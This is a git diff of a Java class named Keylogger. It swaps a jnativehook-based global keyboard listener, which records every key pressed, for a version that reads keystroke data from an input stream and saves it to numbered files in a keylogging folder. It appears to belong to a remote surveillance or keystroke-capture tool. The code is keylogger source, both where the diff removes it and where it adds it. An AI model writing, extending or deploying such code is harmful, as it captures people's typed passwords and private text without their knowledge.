@@ -1,34 +1,84 @@
 package model;
 
-import com.github.kwhat.jnativehook.GlobalScreen;
-import com.github.kwhat.jnativehook.NativeHookException;
-import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
-import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
+import java.io.*;
 
-import java.util.ArrayList;
-
-public class Keylogger implements NativeKeyListener {
-
-    public ArrayList<String> logs = new ArrayList<String>();
-
-    private void addLog(String log) {
-        logs.add(log);
+public class Keylogger {
+    public Keylogger(InputStream inputStream, OutputStream outputStream)
+    {
+        initComponents(inputStream, outputStream);
     }
 
-    public void clearLogs() {
-        logs = new ArrayList<String>();
+    private void initComponents(InputStream inputStream, OutputStream outputStream)
+    {
+        this.inputStream = inputStream;
+        this.outputStream = outputStream;
     }
 
-    public void nativeKeyPressed(NativeKeyEvent e) {
-        addLog(NativeKeyEvent.getKeyText(e.getKeyCode()) + " ");
-        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
+    public void handleHook()
+    {
+        isHook = true;
     }
 
-    public void nativeKeyReleased(NativeKeyEvent e) {
+    public void handleUnHook()
+    {
+        try
+        {
+            writer = new PrintWriter("./keylogging/keylog" + Integer.toString(currentFileName) + ".txt", "UTF-8");
+            writer.println(keylogging);
+            writer.close();
+            keylogging = "";
+            isHook = false;
+        }
+        catch (FileNotFoundException fnfE)
+        {
 
+        }
+        catch (UnsupportedEncodingException ueE)
+        {
+
+        }
+
+        return;
     }
 
-    public void nativeKeyTyped(NativeKeyEvent e) {
+    public String handlePrint()
+    {
+        try
+        {
+            if (isHook)
+            {
+                byte[] buffer = new byte[5 * 1024];
+                inputStream.read(buffer);
+                keylogging = new String(buffer);
+                keylogging = keylogging.trim();
 
+                return keylogging;
+            }
+        }
+        catch (IOException ioE)
+        {
+            //
+        }
+
+        return keylogging;
     }
+
+    public String getKeylogging() {
+        return keylogging;
+    }
+
+    public void setCurrentFileName(int currentFileName) {
+        this.currentFileName = currentFileName;
+    }
+
+    public int getCurrentFileName() {
+        return currentFileName;
+    }
+
+    private InputStream inputStream;
+    private OutputStream outputStream;
+    private Boolean isHook;
+    private String keylogging;
+    private PrintWriter writer;
+    private int currentFileName = 0;
 }
